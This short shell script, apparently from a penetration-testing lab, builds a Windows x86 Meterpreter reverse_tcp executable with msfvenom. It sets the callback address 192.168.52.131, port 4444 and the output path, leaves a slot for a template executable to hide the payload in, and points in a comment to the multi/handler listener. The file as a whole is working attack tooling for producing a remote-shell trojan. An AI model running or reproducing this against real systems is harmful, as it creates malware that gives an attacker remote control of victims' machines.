ip=192.168.52.131
port=4444
arch=x86
platform=windows
format=exe
payload=windows/meterpreter/reverse_tcp
x = 
#use exploit/multi/handler
out=../win_out/meter_re_tcp_x86.exe
msfvenom -p $payload LHOST=$ip LPORT=$port -f $format -x $x -a $arch --platform $platform -o $out
